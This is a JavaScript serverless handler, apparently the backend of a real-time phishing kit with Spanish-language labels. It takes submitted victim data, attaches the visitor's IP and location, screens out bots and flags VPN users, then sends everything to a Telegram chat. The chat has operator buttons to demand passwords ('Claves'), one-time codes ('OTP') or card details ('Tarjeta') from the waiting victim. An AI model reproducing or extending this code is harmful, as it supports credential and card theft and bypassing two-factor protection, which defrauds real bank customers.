import { verifyTurnstile, getClientIp, checkVpnProxy, sendTelegramMessage, setUserState } from '../lib/utils.js';

function escapeHtml(unsafe) {
    return String(unsafe).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const payload = req.body;
    const clientIp = getClientIp(req);
    const country = req.headers['x-vercel-ip-country'] || 'Desconocido';
    const city = req.headers['x-vercel-ip-city'] || 'Desconocida';

    const isHuman = await verifyTurnstile(payload?.cf_token);
    if (!isHuman) return res.status(403).json({ detail: "Validación anti-bot fallida" });

    const vpnAlert = await checkVpnProxy(clientIp);

    let msg = `<b>Nuevo Envío Recibido</b>${vpnAlert}\n`;
    msg += `<b>IP:</b> ${clientIp}\n`;
    msg += `<b>Ubicación:</b> ${city}, ${country}\n\n`;

    const data = payload?.mensaje || {};

    if (data.embeds && data.embeds.length > 0) {
        const embed = data.embeds[0];
        if (embed.title) msg += `<b>${escapeHtml(embed.title)}</b>\n\n`;
        if (embed.fields) {
            embed.fields.forEach(f => {
                msg += `<b>${escapeHtml(f.name)}:</b> ${escapeHtml(f.value)}\n`;
            });
        }
    } else {
        for (const [k, v] of Object.entries(data)) {
            if (k !== 'embeds') {
                msg += `<b>${escapeHtml(k)}:</b> ${escapeHtml(v)}\n`;
            }
        }
    }

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: "🔑 Pedir Claves", callback_data: `cmd|clvs|${clientIp}` },
                { text: "📱 Pedir OTP", callback_data: `cmd|otp|${clientIp}` }
            ],
            [
                { text: "💳 Pedir Tarjeta", callback_data: `cmd|tarjeta|${clientIp}` },
                { text: "❌ Datos Inválidos", callback_data: `cmd|error|${clientIp}` }
            ],
            [
                { text: "✅ Finalizar (Error)", callback_data: `cmd|fin|${clientIp}` }
            ]
        ]
    };

    await setUserState(clientIp, 'WAITING');
    await sendTelegramMessage(msg, replyMarkup);

    res.status(200).json({ status: "success", message: "Datos recibidos correctamente" });
}
